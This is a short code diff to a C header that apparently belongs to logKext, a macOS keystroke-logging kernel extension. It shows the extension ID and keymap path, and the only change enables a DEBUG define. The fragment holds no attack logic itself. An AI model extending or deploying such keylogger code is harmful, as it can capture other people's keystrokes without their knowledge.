@@ -24,4 +24,4 @@ enum {
 
 #define KEXT_ID				"com.fsb.kext.logKext"
 #define KEYMAP_PATH			"/Library/Preferences/logKextKeymap.plist"
-//#define DEBUG
+#define DEBUG
